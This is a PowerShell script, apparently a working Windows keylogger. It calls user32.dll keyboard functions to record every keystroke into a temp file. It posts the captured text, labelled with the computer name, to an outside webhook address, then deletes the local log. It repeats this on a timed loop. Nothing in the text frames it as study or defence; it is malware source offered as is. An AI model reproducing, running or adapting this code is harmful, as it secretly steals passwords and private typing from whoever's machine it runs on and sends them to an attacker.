
Write-Output $hook
Write-Output $RunTime
Write-Output $TimesRun

Do{
    $getT = Get-Date;
    $end = $getT.addminutes($RunTime);
    
    function Start-Key($Path="$env:temp\klog.txt"){
        $sigs = "
            [DllImport(`"user32.dll`", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);
            [DllImport(`"user32.dll`", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate);
            [DllImport(`"user32.dll`", CharSet=CharSet.Auto)] public static extern int MapVirtualKey(uint uCode, int uMapType);
            [DllImport(`"user32.dll`", CharSet=CharSet.Auto)] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
        ";

        $API = Add-Type -MemberDefinition $sigs -Name "Win32" -Namespace API -PassThru;

        New-Item -Path $Path -ItemType File -Force;

        try{
            $rnnr = 0;

            while ($TimesRun -ge $rnnr){
                while ($end -ge $getT){

                    Start-Sleep -Milliseconds 30;

                    for($ascii = 9; $ascii -le 254; $ascii++){
                        $state = $API::GetAsyncKeyState($ascii);
                        if($state -eq -32767){
                            $null = [console]::CapsLock;
                            $virtualKey = $API::MapVirtualKey($ascii, 3);
                            $kbstate = New-Object Byte[] 256;
                            
                            $API::GetKeyboardState($kbstate);
                            
                            $mychar = New-Object -TypeName System.Text.StringBuilder;
                            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0);
                            if($success){
                                [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode);
                            }
                        }
                    }

                    $getT = Get-Date;
                };

                Start-Sleep 1; 

                $fileBytes = [System.IO.File]::ReadAllBytes($Path);
                $fileContent =  [System.Text.Encoding]::GetEncoding("UTF-8").GetString($fileBytes);
                $boundary = [System.Guid]::NewGuid().ToString();
                $LF = "`r`n";

                $data = @{
                    "username" = $env:COMPUTERNAME;
                    "content" = "$env:COMPUTERNAME keylog";
                    "attachments" = @(
                        @{
                            "id" = 0;
                            "description" = "$env:COMPUTERNAME keylog";
                            "filename" = "$env:COMPUTERNAME-keylog.txt";
                        }
                    )
                } | ConvertTo-JSON;

                $body = (
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"payload_json`"",
                    "Content-Type: application/json$LF",
                    $data,
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$env:COMPUTERNAME-keylog.txt`"",
                    "Content-Type: text/plain$LF",
                    $fileContent,
                    "--$boundary--$LF"
                ) -join $LF;

                Invoke-WebRequest -Uri $hook -ContentType ("multipart/form-data; boundary=$boundary") -Method Post -Body $body;
                Remove-Item -Path $Path -force;
            }
        }finally{}
    }
    Start-Key;
}While ($a -le 5);